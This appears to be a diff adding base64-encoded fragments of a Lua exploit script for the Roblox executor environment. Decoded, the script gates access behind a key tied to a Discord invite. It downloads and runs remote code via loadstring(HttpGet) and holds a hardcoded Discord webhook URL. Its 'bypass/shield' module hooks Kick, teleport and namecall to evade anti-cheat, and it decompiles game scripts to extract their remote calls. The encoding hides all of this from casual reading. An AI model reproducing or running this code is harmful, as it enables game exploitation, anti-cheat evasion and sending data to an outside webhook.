+'bG9jYWwgcyA9IHQgPCAwLjUgYW5kIDIgKiB0ICogdCBvciAxIC0gKC0yICogdCArIDIpXjIgLyAyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdywgb3gs',
+'IGJsb2NrVCwgZXh0VCwgZWRnZVQsIGVkZ2VHVCwgYwogICAgICAgICAgICAgICAgICAgIGlmIHMgPD0gMC42NSB0aGVuCiAgICAgICAgICAgICAgICAgICAg',
+'ICAgIGxvY2FsIHAgPSBzIC8gMC42NQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwcyA9IHAgPCAwLjUgYW5kIDIgKiBwICogcCBvciAxIC0gKC0y',
+'ICogcCArIDIpXjIgLyAyCiAgICAgICAgICAgICAgICAgICAgICAgIHcgPSBwcyAqIGJ3CiAgICAgICAgICAgICAgICAgICAgICAgIG94ID0gMTkwIC0gdwog',
+'ICAgICAgICAgICAgICAgICAgICAgICBibG9ja1QgPSAwLjEKICAgICAgICAgICAgICAgICAgICAgICAgZWRnZVQgPSAwLjA1CiAgICAgICAgICAgICAgICAg',
+'ICAgICAgIGVkZ2VHVCA9IDAuNQogICAgICAgICAgICAgICAgICAgICAgICBleHRUID0gMC43NQogICAgICAgICAgICAgICAgICAgICAgICBjID0gcHMKICAg',
+'ICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHAgPSAocyAtIDAuNjUpIC8gMC4zNQogICAgICAgICAgICAgICAg',
+'ICAgICAgICBsb2NhbCBwcyA9IDEgLSAoMSAtIHApXjMKICAgICAgICAgICAgICAgICAgICAgICAgdyA9IGJ3CiAgICAgICAgICAgICAgICAgICAgICAgIG94',
+'ID0gLTE5MCAtIDMwMCAqIHBzCiAgICAgICAgICAgICAgICAgICAgICAgIGJsb2NrVCA9IDAuMSArIHBzICogMC44CiAgICAgICAgICAgICAgICAgICAgICAg',
+'IGVkZ2VUID0gMC4wNSArIHBzICogMC45CiAgICAgICAgICAgICAgICAgICAgICAgIGVkZ2VHVCA9IDAuNSArIHBzICogMC40NQogICAgICAgICAgICAgICAg',
+'ICAgICAgICBleHRUID0gMC43NSArIHBzICogMC4yCiAgICAgICAgICAgICAgICAgICAgICAgIGMgPSAxCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAg',
+'ICAgICAgICAgICAgICAgYmxvY2suU2l6ZSA9IFVEaW0yLm5ldygwLCB3LCAwLCAyNjApCiAgICAgICAgICAgICAgICAgICAgYmxvY2suUG9zaXRpb24gPSBV',
+'RGltMi5uZXcoMC41LCBveCwgMC41LCAtMTMwKQogICAgICAgICAgICAgICAgICAgIGJsb2NrLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBibG9ja1QKICAg',
+'ICAgICAgICAgICAgICAgICBlZGdlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBlZGdlVAogICAgICAgICAgICAgICAgICAgIGVkZ2VHbG93LkJhY2tncm91',
+'bmRUcmFuc3BhcmVuY3kgPSBlZGdlR1QKICAgICAgICAgICAgICAgICAgICBleHRHbG93LlNpemUgPSBVRGltMi5uZXcoMCwgdyArIDQwLCAwLCAzMTApCiAg',
+'ICAgICAgICAgICAgICAgICAgZXh0R2xvdy5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIG94IC0gMjAsIDAuNSwgLTE1NSkKICAgICAgICAgICAgICAgICAg',
+'ICBleHRHbG93LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBleHRUCiAgICAgICAgICAgICAgICAgICAgZi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC4x',
+'ICsgbWF0aC5taW4oMSwgYykgKiAwLjg1CiAgICAgICAgICAgICAgICAgICAgZi5Cb3JkZXJTaXplUGl4ZWwgPSBtYXRoLmZsb29yKDQgKiAoMSAtIG1hdGgu',
+'bWluKDEsIGMpKSkKICAgICAgICAgICAgICAgICAgICBpZiB0ID49IDEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjb25uMjpEaXNjb25uZWN0KCkK',
+'ICAgICAgICAgICAgICAgICAgICAgICAgZzpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAg',
+'ICAgZW5kKQogICAgICAgIGVsc2UKICAgICAgICAgICAgd3JvbmdBdHRlbXB0cyA9IHdyb25nQXR0ZW1wdHMgKyAxCiAgICAgICAgICAgIGlmIHdyb25nQXR0',
+'ZW1wdHMgPj0gMyB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBtc2cgPSAiQUNDRVNTIERFTklFRCAtIEludmFsaWQgS2V5IVxuSm9pbiBvdXIgRGlzY29y',
+'ZCBmb3IgYSB2YWxpZCBrZXk6XG5kaXNjb3JkLmdnL1VCZUJFaHhVZ1EiCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIGdhbWU6R2V0U2Vydmlj',
+'ZSgiUGxheWVycyIpLkxvY2FsUGxheWVyOktpY2sobXNnKSBlbmQpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAg',
+'IHN0YXQuVGV4dCA9ICJJTlZBTElEIEtFWSAoIiAuLiAoMyAtIHdyb25nQXR0ZW1wdHMpIC4uICIgdHJpZXMgbGVmdCkiOyBzdGF0LlRleHRDb2xvcjMgPSBD',
+'b2xvcjMuZnJvbVJHQigyNTUsIDgwLCA4MCkKICAgICAgICAgICAgYm94LlRleHQgPSAiIgogICAgICAgIGVuZAogICAgZW5kKQoKICAgIGRjLk1vdXNlQnV0',
+'dG9uMUNsaWNrOkNvbm5lY3QoY29weURpc2NvcmQpCiAgICBib3guRm9jdXNlZDpDb25uZWN0KGZ1bmN0aW9uKCkgYm94LkJvcmRlckNvbG9yMyA9IENvbG9y',
+'My5mcm9tUkdCKDAsIDIzMCwgMCkgZW5kKQogICAgYm94LkZvY3VzTG9zdDpDb25uZWN0KGZ1bmN0aW9uKGVudGVyKSBib3guQm9yZGVyQ29sb3IzID0gQ29s',
+'b3IzLmZyb21SR0IoMCwgMTcwLCAwKTsgaWYgZW50ZXIgdGhlbiBidG4uTW91c2VCdXR0b24xQ2xpY2s6RmlyZSgpIGVuZCBlbmQpCmVuZAp3aGlsZSBub3Qg',
+'X0tFWV9BVVRIT1JJWkVEIGRvIHRhc2sud2FpdCgxKSBlbmQKcGNhbGwoZnVuY3Rpb24oKSBpZiBfa2V5R3VpIHRoZW4gX2tleUd1aTpEZXN0cm95KCkgZW5k',
+'IGVuZCkKCmxvY2FsIFJheWZpZWxkCmRvCiAgICBsb2NhbCBvaywgcmVzID0gcGNhbGwobG9hZHN0cmluZywgZ2FtZTpIdHRwR2V0KCJodHRwczovL3Npcml1',
+'cy5tZW51L3JheWZpZWxkIikpCiAgICBpZiBub3Qgb2sgb3Igbm90IHJlcyB0aGVuCiAgICAgICAgbG9jYWwgZiA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3Vp',
+'Iik7IGYuTmFtZSA9ICJESEVyciI7IHBjYWxsKGZ1bmN0aW9uKCkgZi5QYXJlbnQgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKSBlbmQpCiAgICAgICAg',
+'bG9jYWwgdCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIik7IHQuU2l6ZSA9IFVEaW0yLm5ldygxLDAsMSwwKTsgdC5UZXh0ID0gIlJheWZpZWxkIGZhaWxl',
+'ZCB0byBsb2FkISI7IHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSw4MCw4MCk7IHQuRm9udCA9IEVudW0uRm9udC5Db2RlOyB0LlRleHRTaXpl',
+'ID0gMTg7IHQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7IHQuUGFyZW50ID0gZgogICAgICAgIHJldHVybgogICAgZW5kCiAgICBSYXlmaWVsZCA9IHJl',
+'cygpCmVuZAoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIEh0dHBTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJI',
+'dHRwU2VydmljZSIpCmxvY2FsIExQID0gUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgX2RlY29tcGlsZSA9ICh0eXBlb2YoZGVjb21waWxlKT09ImZ1bmN0',
+'aW9uIiBhbmQgZGVjb21waWxlKSBvciAodHlwZW9mKERlY29tcGlsZSk9PSJmdW5jdGlvbiIgYW5kIERlY29tcGlsZSkgb3IgbmlsCmxvY2FsIF9nZXRieXRl',
+'Y29kZSA9ICh0eXBlb2YoZ2V0c2NyaXB0Ynl0ZWNvZGUpPT0iZnVuY3Rpb24iIGFuZCBnZXRzY3JpcHRieXRlY29kZSkgb3IgbmlsCmxvY2FsIF9zZXRjbGlw',
+'Ym9hcmQgPSAodHlwZW9mKHNldGNsaXBib2FyZCk9PSJmdW5jdGlvbiIgYW5kIHNldGNsaXBib2FyZCkgb3IgKHR5cGVvZihjbGlwYm9hcmQpPT0iZnVuY3Rp',
+'b24iIGFuZCBjbGlwYm9hcmQpIG9yICh0eXBlb2YodG9jbGlwYm9hcmQpPT0iZnVuY3Rpb24iIGFuZCB0b2NsaXBib2FyZCkgb3IgbmlsCgpsb2NhbCBfcmVx',
+'dWVzdCA9ICh0eXBlb2YocmVxdWVzdCk9PSJmdW5jdGlvbiIgYW5kIHJlcXVlc3QpIG9yICh0eXBlb2Yoc3luKT09InRhYmxlIiBhbmQgdHlwZW9mKHN5bi5y',
+'ZXF1ZXN0KT09ImZ1bmN0aW9uIiBhbmQgc3luLnJlcXVlc3QpIG9yICh0eXBlb2YoaHR0cCk9PSJ0YWJsZSIgYW5kIHR5cGVvZihodHRwLnJlcXVlc3QpPT0i',
+'ZnVuY3Rpb24iIGFuZCBodHRwLnJlcXVlc3QpIG9yICh0eXBlb2YoaHR0cF9yZXF1ZXN0KT09ImZ1bmN0aW9uIiBhbmQgaHR0cF9yZXF1ZXN0KSBvciBuaWwK',
+'bG9jYWwgV0VCSE9PS19TRUNSRVQgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTc1NTAyNTczNjAxMTg0Ny9TeFB5am5QbzU2dVVs',
+'bTlFem5UWF9tSU9GSHRkWHJ1aXVXMG10amJ4QzBzRkJBOWJMMGRkVlZ0R240N25YZE5JQjYwYyIKCmxvY2FsIFNDUklQVF9DTEFTU0VTID0geyBMb2NhbFNj',
+'cmlwdD10cnVlLCBTY3JpcHQ9dHJ1ZSwgTW9kdWxlU2NyaXB0PXRydWUgfQpsb2NhbCBSRU1PVEVfQ0xBU1NFUyA9IHsgUmVtb3RlRXZlbnQ9dHJ1ZSwgUmVt',
+'b3RlRnVuY3Rpb249dHJ1ZSwgQmluZGFibGVFdmVudD10cnVlLCBCaW5kYWJsZUZ1bmN0aW9uPXRydWUgfQpsb2NhbCBQQVJUX0NMQVNTRVMgPSB7IFBhcnQ9',
+'dHJ1ZSwgTWVzaFBhcnQ9dHJ1ZSwgVW5pb25PcGVyYXRpb249dHJ1ZSB9Cgpsb2NhbCBST0JMT1hfSU5URVJOQUxfS0VZV09SRFMgPSB7CiAgICBDb3JlUGFj',
+'a2FnZXMgPSB0cnVlLCBDb3JlR3VpID0gdHJ1ZSwgQ29yZVNjcmlwdHMgPSB0cnVlLAogICAgUm9ibG94R3VpID0gdHJ1ZSwgUm9ibG94UGx1Z2luID0gdHJ1',
+'ZSwKfQoKbG9jYWwgZnVuY3Rpb24gaXNSb2Jsb3hJbnRlcm5hbChpbnN0KQogICAgbG9jYWwgcCA9IGluc3QuUGFyZW50CiAgICB3aGlsZSBwIGFuZCBwIH49',
+'IGdhbWUgZG8KICAgICAgICBpZiBST0JMT1hfSU5URVJOQUxfS0VZV09SRFNbcC5OYW1lXSB0aGVuIHJldHVybiB0cnVlIGVuZAogICAgICAgIHAgPSBwLlBh',
+'cmVudAogICAgZW5kCiAgICByZXR1cm4gZmFsc2UKZW5kCgoKCi0tID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09',
+'PT09PT09PT09PQotLSBCWVBBU1MgLyBTSElFTEQgTU9EVUxFCi0tID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09',
+'PT09PT09PT09PQpsb2NhbCBzaGllbGRBY3RpdmUgPSBmYWxzZQpsb2NhbCBzaGllbGRIb29rcyA9IHt9CmxvY2FsIG9yaWdLaWNrID0gbmlsCmxvY2FsIGZ1',
+'bmN0aW9uIGVuYWJsZVNoaWVsZCgpCiAgICBpZiBzaGllbGRBY3RpdmUgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBmdW5jdGlvbiBzYWZlSG9vaygpIGVu',
+'ZAogICAgbG9jYWwgb2ssIHIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcHMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAg',
+'IGxvY2FsIGxwID0gcHMuTG9jYWxQbGF5ZXIKCiAgICAgICAgLS0gMSkgS2ljay9raWNrIG92ZXJyaWRlIG9uIExvY2FsUGxheWVyIChzYXZlIG9yaWdpbmFs',
+'cykKICAgICAgICBpZiBscCB0aGVuCiAgICAgICAgICAgIG9yaWdLaWNrID0gbHAuS2ljawogICAgICAgICAgICBpZiBscC5LaWNrIHRoZW4gbHAuS2ljayA9',
+'IGZ1bmN0aW9uKCkgcmV0dXJuIGVuZCBlbmQKICAgICAgICAgICAgaWYgbHAua2ljayB0aGVuIGxwLmtpY2sgPSBmdW5jdGlvbigpIHJldHVybiBlbmQgZW5k',
+'CiAgICAgICAgZW5kCiAgICAgICAgcHMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbHIpCiAgICAgICAgICAgIGlmIHBsciA9PSBscCB0aGVuCiAg',
+'ICAgICAgICAgICAgICBpZiBub3Qgb3JpZ0tpY2sgdGhlbiBvcmlnS2ljayA9IHBsci5LaWNrIGVuZAogICAgICAgICAgICAgICAgaWYgcGxyLktpY2sgdGhl',
+'biBwbHIuS2ljayA9IGZ1bmN0aW9uKCkgcmV0dXJuIGVuZCBlbmQKICAgICAgICAgICAgICAgIGlmIHBsci5raWNrIHRoZW4gcGxyLmtpY2sgPSBmdW5jdGlv',
+'bigpIHJldHVybiBlbmQgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKCiAgICAgICAgLS0gMikgX19uYW1lY2FsbCBob29rIG9uIFBsYXllcnMg',
+'c2VydmljZQogICAgICAgIGxvY2FsIHBzTVQgPSBnZXRyYXdtZXRhdGFibGUgYW5kIGdldHJhd21ldGF0YWJsZShwcykKICAgICAgICBpZiBwc01UIHRoZW4K',
+'ICAgICAgICAgICAgbG9jYWwgb2xkTkMgPSBwc01ULl9fbmFtZWNhbGwKICAgICAgICAgICAgaWYgb2xkTkMgdGhlbgogICAgICAgICAgICAgICAgcHNNVC5f',
+'X25hbWVjYWxsID0gZnVuY3Rpb24oc2VsZiwgLi4uKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIG0gPSBnZXRuYW1lY2FsbG1ldGhvZCBhbmQgZ2V0bmFt',
+'ZWNhbGxtZXRob2QoKQogICAgICAgICAgICAgICAgICAgIGlmIG0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBsbSA9IG06bG93ZXIoKQog',
+'ICAgICAgICAgICAgICAgICAgICAgICBpZiBsbSA9PSAia2ljayIgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBsbSA9',
+'PSAibG9hZHN0cmluZyIgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHJldHVybiBvbGRO',
+'QyhzZWxmLCAuLi4pCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHNoaWVsZEhvb2tzWyNzaGllbGRIb29rcysxXSA9IGZ1bmN0aW9uKCkg',
+'cHNNVC5fX25hbWVjYWxsID0gb2xkTkMgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICAtLSAzKSBfX25hbWVjYWxsIGhvb2sgb24g',
+'Z2FtZSBmb3IgVGVsZXBvcnQKICAgICAgICBsb2NhbCBnYW1lTVQgPSBnZXRyYXdtZXRhdGFibGUgYW5kIGdldHJhd21ldGF0YWJsZShnYW1lKQogICAgICAg',
+'IGlmIGdhbWVNVCB0aGVuCiAgICAgICAgICAgIGxvY2FsIG9sZEdOQyA9IGdhbWVNVC5fX25hbWVjYWxsCiAgICAgICAgICAgIGlmIG9sZEdOQyB0aGVuCiAg',
+'ICAgICAgICAgICAgICBnYW1lTVQuX19uYW1lY2FsbCA9IGZ1bmN0aW9uKHNlbGYsIC4uLikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBtID0gZ2V0bmFt',
+'ZWNhbGxtZXRob2QgYW5kIGdldG5hbWVjYWxsbWV0aG9kKCkKICAgICAgICAgICAgICAgICAgICBpZiBtIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAg',
+'bG9jYWwgbG0gPSBtOmxvd2VyKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbG0gPT0gInRlbGVwb3J0IiBvciBsbSA9PSAidGVsZXBvcnR0b3BsYWNl',
+'aW5zdGFuY2UiIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICByZXR1cm4gb2xkR05DKHNl',
+'bGYsIC4uLikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgc2hpZWxkSG9va3NbI3NoaWVsZEhvb2tzKzFdID0gZnVuY3Rpb24oKSBnYW1l',
+'TVQuX19uYW1lY2FsbCA9IG9sZEdOQyBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIC0tIDQpIEFudGktZnJlZXplOiBrZWVwIGNo',
+'YXJhY3RlciBhbmltYXRlYWJsZQogICAgICAgIGxvY2FsIGNoYXIgPSBscCBhbmQgbHAuQ2hhcmFjdGVyCiAgICAgICAgaWYgY2hhciB0aGVuCiAgICAgICAg',
+'ICAgIGxvY2FsIGhycCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICBpZiBocnAgYW5kIGhycDpGaW5kRmly',
+'c3RDaGlsZE9mQ2xhc3MoIkJvZHlQb3NpdGlvbiIpIHRoZW4gaHJwLkJvZHlQb3NpdGlvbjpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgIGlmIGhycCBhbmQg',
+'aHJwOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiQm9keVZlbG9jaXR5IikgdGhlbiBocnAuQm9keVZlbG9jaXR5OkRlc3Ryb3koKSBlbmQKICAgICAgICBlbmQK',
+'ICAgICAgICBscC5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGMpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGxvY2Fs',
+'IGhycCA9IGM6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICBpZiBocnAgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8s',
+'IGIgaW4gaXBhaXJzKGhycDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGI6SXNBKCJCb2R5UG9zaXRpb24iKSBvciBiOklzQSgi',
+'Qm9keVZlbG9jaXR5IikgdGhlbiBiOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBl',
+'bmQpCiAgICBzaGllbGRBY3RpdmUgPSBvayBhbmQgciB+PSBmYWxzZQplbmQKCmxvY2FsIGZ1bmN0aW9uIGRpc2FibGVTaGllbGQoKQogICAgZm9yIF8sIGZu',
+'IGluIGlwYWlycyhzaGllbGRIb29rcykgZG8gcGNhbGwoZm4pIGVuZAogICAgc2hpZWxkSG9va3MgPSB7fQogICAgc2hpZWxkQWN0aXZlID0gZmFsc2UKZW5k',
+'Cgpsb2NhbCBhdXRvS2lja0VuYWJsZWQgPSB0cnVlCmxvY2FsIHNjYW5BYm9ydGVkID0gZmFsc2UKCmxvY2FsIGZ1bmN0aW9uIGdldEdhbWVOYW1lKCkKICAg',
+'IGxvY2FsIGduID0gIiIKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBpbmZvID0gZ2FtZTpHZXRTZXJ2aWNlKCJNYXJrZXRwbGFjZVNlcnZp',
+'Y2UiKTpHZXRQcm9kdWN0SW5mbyhnYW1lLlBsYWNlSWQpCiAgICAgICAgaWYgaW5mbyBhbmQgaW5mby5OYW1lIGFuZCAjaW5mby5OYW1lID4gMCB0aGVuIGdu',
+'ID0gaW5mby5OYW1lOnN1YigxLDgwKSBlbmQKICAgIGVuZCkKICAgIGlmICNnbiA9PSAwIHRoZW4gcGNhbGwoZnVuY3Rpb24oKSBnbiA9IHRvc3RyaW5nKGdh',
+'bWUuTmFtZSk6c3ViKDEsODApIGVuZCkgZW5kCiAgICBpZiAjZ24gPT0gMCB0aGVuIGduID0gIkdhbWUiIGVuZAogICAgcmV0dXJuIGduCmVuZAoKbG9jYWwg',
+'ZnVuY3Rpb24gZnVsbFBhdGgoaW5zdCkKICAgIGxvY2FsIG9rLCByZXMgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcCA9IHt9OyBsb2NhbCBj',
+'ID0gaW5zdAogICAgICAgIHdoaWxlIGMgYW5kIGMgfj0gZ2FtZSBkbyBwWyNwKzFdID0gYy5OYW1lOyBjID0gYy5QYXJlbnQgZW5kCiAgICAgICAgbG9jYWwg',
+'biA9ICNwCiAgICAgICAgZm9yIGkgPSAxLCBtYXRoLmZsb29yKG4vMikgZG8gcFtpXSwgcFtuLWkrMV0gPSBwW24taSsxXSwgcFtpXSBlbmQKICAgICAgICBy',
+'ZXR1cm4gImdhbWUuIiAuLiB0YWJsZS5jb25jYXQocCwgIi4iKQogICAgZW5kKQogICAgcmV0dXJuIG9rIGFuZCByZXMgb3IgdG9zdHJpbmcoaW5zdCkKZW5k',
+'Cgpsb2NhbCBmdW5jdGlvbiB0cnVuYyhzLCBtKQogICAgcyA9IHRvc3RyaW5nKHMpCiAgICByZXR1cm4gI3MgPiBtIGFuZCBzOnN1YigxLCBtKSAuLiAiLi4u',
+'IiBvciBzCmVuZAoKbG9jYWwgZnVuY3Rpb24gdHJ5RGVjb21waWxlKGluc3QpCiAgICBpZiBfZGVjb21waWxlIHRoZW4gbG9jYWwgbywgcyA9IHBjYWxsKF9k',
+'ZWNvbXBpbGUsIGluc3QpOyBpZiBvIGFuZCB0eXBlKHMpID09ICJzdHJpbmciIGFuZCAjcyA+IDAgdGhlbiByZXR1cm4gImRlY29tcGlsZSgpIiwgcyBlbmQg',
+'ZW5kCiAgICBpZiBpbnN0LkNsYXNzTmFtZSB+PSAiTW9kdWxlU2NyaXB0IiBhbmQgX2dldGJ5dGVjb2RlIHRoZW4gbG9jYWwgbywgcyA9IHBjYWxsKF9nZXRi',
+'eXRlY29kZSwgaW5zdCk7IGlmIG8gYW5kIHR5cGUocykgPT0gInN0cmluZyIgYW5kICNzID4gMCB0aGVuIHJldHVybiAiYnl0ZWNvZGUiLCBzIGVuZCBlbmQK',
+'ICAgIGxvY2FsIG8sIHMgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBpbnN0LlNvdXJjZSBlbmQpCiAgICBpZiBvIGFuZCB0eXBlKHMpID09ICJzdHJpbmci',
+'IGFuZCAjcyA+IDAgdGhlbiByZXR1cm4gImRpcmVjdF9zb3VyY2UiLCBzIGVuZAogICAgcmV0dXJuIG5pbCwgbmlsCmVuZAoKbG9jYWwgZnVuY3Rpb24gZXh0',
+'cmFjdFJlbW90ZUNhbGxzKHNyYykKICAgIGxvY2FsIHIgPSB7fQogICAgaWYgdHlwZShzcmMpIH49ICJzdHJpbmciIG9yICNzcmMgPT0gMCB0aGVuIHJldHVy',
+'biByIGVuZAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciBjYWxsLCBmYXJncyBpbiBzcmM6Z21hdGNoKCIoWyV3XyUuXSspOkZpcmVTZXJ2ZXIl',
+'YigpIikgZG8KICAgICAgICAgICAgbG9jYWwgYXJncyA9IGZhcmdzOm1hdGNoKCJeJSgoLiopJSkkIikgb3IgIiIKICAgICAgICAgICAgbG9jYWwgYWMgPSAw',
+'OyBmb3IgXyBpbiBhcmdzOmdtYXRjaCgiW14sXSsiKSBkbyBhYyA9IGFjICsgMSBlbmQKICAgICAgICAgICAgclsjcisxXSA9IHsgdHlwZSA9ICJGaXJlU2Vy',
+'dmVyIiwgcmVtb3RlID0gY2FsbCwgYXJncyA9IGFjLCBhcmdzU3RyID0gdHJ1bmMoYXJncywgODApIH0KICAgICAgICBlbmQKICAgIGVuZCkKICAgIHBjYWxs',
+'KGZ1bmN0aW9uKCkKICAgICAgICBmb3IgY2FsbCwgZmFyZ3MgaW4gc3JjOmdtYXRjaCgiKFsld18lLl0rKTpJbnZva2VTZXJ2ZXIlYigpIikgZG8KICAgICAg',
+'ICAgICAgbG9jYWwgYXJncyA9IGZhcmdzOm1hdGNoKCJeJSgoLiopJSkkIikgb3IgIiIKICAgICAgICAgICAgbG9jYWwgYWMgPSAwOyBmb3IgXyBpbiBhcmdz',
+'OmdtYXRjaCgiW14sXSsiKSBkbyBhYyA9IGFjICsgMSBlbmQKICAgICAgICAgICAgclsjcisxXSA9IHsgdHlwZSA9ICJJbnZva2VTZXJ2ZXIiLCByZW1vdGUg',
+'PSBjYWxsLCBhcmdzID0gYWMsIGFyZ3NTdHIgPSB0cnVuYyhhcmdzLCA4MCkgfQogICAgICAgIGVuZAogICAgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKQog',
+'ICAgICAgIGZvciBjYWxsLCBmYXJncyBpbiBzcmM6Z21hdGNoKCIoWyV3XyUuXSspOkZpcmUlYigpIikgZG8KICAgICAgICAgICAgaWYgbm90IGNhbGw6Zmlu',
+'ZCgiU2VydmVyIikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IGZhcmdzOm1hdGNoKCJeJSgoLiopJSkkIikgb3IgIiIKICAgICAgICAgICAg',
+'ICAgIGxvY2FsIGFjID0gMDsgZm9yIF8gaW4gYXJnczpnbWF0Y2goIlteLF0rIikgZG8gYWMgPSBhYyArIDEgZW5kCiAgICAgICAgICAgICAgICByWyNyKzFd',
+'ID0geyB0eXBlID0gIkZpcmUiLCByZW1vdGUgPSBjYWxsLCBhcmdzID0gYWMsIGFyZ3NTdHIgPSB0cnVuYyhhcmdzLCA4MCkgfQogICAgICAgICAgICBlbmQK',
+'ICAgICAgICBlbmQKICAgIGVuZCkKICAgIHJldHVybiByCmVuZAoKbG9jYWwgZnVuY3Rpb24gZXh0cmFjdFJlcXVpcmVzKHNyYykKICAgIGxvY2FsIHIgPSB7',
+'fQogICAgaWYgdHlwZShzcmMpIH49ICJzdHJpbmciIG9yICNzcmMgPT0gMCB0aGVuIHJldHVybiByIGVuZAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAg',
+'IGZvciByZXF1aXJlQ2FsbCBpbiBzcmM6Z21hdGNoKCJyZXF1aXJlJShbXildKyUpIikgZG8KICAgICAgICAgICAgbG9jYWwgaW5uZXIgPSByZXF1aXJlQ2Fs',
+'bDptYXRjaCgicmVxdWlyZSUoKC4qKSUpJCIpCiAgICAgICAgICAgIGlmIGlubmVyIHRoZW4gcltpbm5lcl0gPSB0cnVlIGVuZAogICAgICAgIGVuZAogICAg',
+'ZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciB3IGluIHNyYzpnbWF0Y2goIldhaXRGb3JDaGlsZCUoXCIoW15cIl0rKVwiJSkiKSBkbyBy',
+'W3ddID0gdHJ1ZSBlbmQKICAgIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBmb3IgdyBpbiBzcmM6Z21hdGNoKCJXYWl0Rm9yQ2hpbGQlKFsn',
+'XSkoW14nXCJdKylbJ10lKSIpIGRvIHJbd10gPSB0cnVlIGVuZAogICAgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciBtb2QsIGNoaWxk',
+'IGluIHNyYzpnbWF0Y2goIihbJXdfXSspOldhaXRGb3JDaGlsZCUoXCIoW15cIl0rKVwiJSkiKSBkbwogICAgICAgICAgICByW21vZCAuLiAiOiIgLi4gY2hp',
+'bGRdID0gdHJ1ZQogICAgICAgIGVuZAogICAgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciBzdmMsIG1vZCBpbiBzcmM6Z21hdGNoKCJn',
+'YW1lOkdldFNlcnZpY2UlKFwiKFteXCJdKylcIiUpOldhaXRGb3JDaGlsZCUoXCIoW15cIl0rKVwiJSkiKSBkbwogICAgICAgICAgICByWyJnYW1lLiIgLi4g',
+'c3ZjIC4uICI6IiAuLiBtb2RdID0gdHJ1ZQogICAgICAgIGVuZAogICAgZW5kKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGZvciBzdmMsIG1vZCBp',
